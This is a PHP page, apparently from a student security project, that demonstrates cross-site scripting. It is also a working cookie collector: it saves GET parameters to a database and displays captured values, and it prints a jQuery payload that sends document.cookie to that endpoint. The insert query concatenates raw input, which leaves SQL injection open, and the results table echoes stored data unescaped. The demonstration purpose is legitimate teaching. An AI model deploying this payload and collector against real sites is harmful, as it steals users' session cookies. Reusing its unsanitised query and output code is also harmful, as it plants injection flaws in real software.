<?php
include_once("../include/config.php");
include_once(INCLUDE_DIR . "/" . "htmlFunctions.php");
include_once(INCLUDE_DIR . "/" . "mitigate.php");
include_once(INCLUDE_DIR . "/" . "FYP_functions.php");

$mysqli = new mysqli( DB_HOST, DB_USER, DB_PASSWORD, DB_DATABASE );#Used till the end

$password = 'password';


if ( isset($_GET['source']) && isset($_GET['values']) ) {
	$source = $_GET['source'];
	$values = $_GET['values'];

	$sql = "INSERT INTO `FYP`.`get_Table` (`source`, `values`, `when`) VALUES ('".$source."', '".$values."', now() );";
	$result = $mysqli->query($sql);
	
	header( 'Location: XSS.php' ) ;
}



?>

<!DOCTYPE html>
<html>
<head>
	<title>XSS Attack</title>
	<link type="text/css" href="style.css" rel="stylesheet" />



	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
	



</head>
<body>
	<div id="wrapper" >

		<h1>XSS attack</h1>

		<h2 id="pc" >User Unaware</h2>

		<p>With an XSS attack we are able to embed javascript tags into text boxes which are intended to be seen by other users.
			We can do anything with this javascript, and it will be carried out by the user loading the script.</p>

			<p>Here is an example to get  all  the users  cookie information with out the users consent. The cookie contains:</p>
			<ul>
				<li>First name</li>
				<li>Surname</li>
				<li>email</li>
				<li>A security check, and</li>
				<li>User id (which shouldn't be known by anyone)</li>
			</ul>

			<!--
			<script type="text/javascript" > $(document).ready(function(){ $.get( "../attacks/XSS.php", { "source" : "Well", "values" : document.cookie }, function(data){ } ) }); </script>
		-->
		<p>Code:</p>
		<code><?php echo htmlentities('<script type="text/javascript" >') . "<br />" .
			htmlentities('$(document).ready(function(){') . "<br />" .
				htmlentities('$.get(') . "<br />" .
					htmlentities('"../attacks/XSS.php", ') . "<br />" .
					htmlentities('{ "source" : "XSS attacking", "values" : document.cookie }, ') . "<br />" .
					htmlentities('function(data){ }') . "<br />" .
					htmlentities(')') . "<br />" .
	htmlentities('});') . "<br />" .
htmlentities('</script>'); ?></code>

<h2>Results</h2>
<p>Here are some of the session id's we received from carrying out this attack</p>
<!--
			<script type="text/javascript" >
				$(document).ready(function(){
					$.get(
						"../attacks/XSS.php", 
						{ "source" : "Well", "values" : document.cookie }, 
						function(data){ }
						)
				});
			</script>

		-->

		<?php




		$sql = "SELECT * FROM get_Table ORDER BY `when` DESC";
		if ($result = $mysqli->query($sql)) {
			echo "<table>";
			echo "<tr><th>Source</th><th>Values</th></tr>";
			while($row = $result->fetch_assoc()){
				echo "<tr><td>". $row['when'] ."</td><td>". $row['source'] ."</td><td>". $row['values'] ."</td></tr>";
			}
			echo "</table>";
		}


		?>




	</div>
</body>
</html>
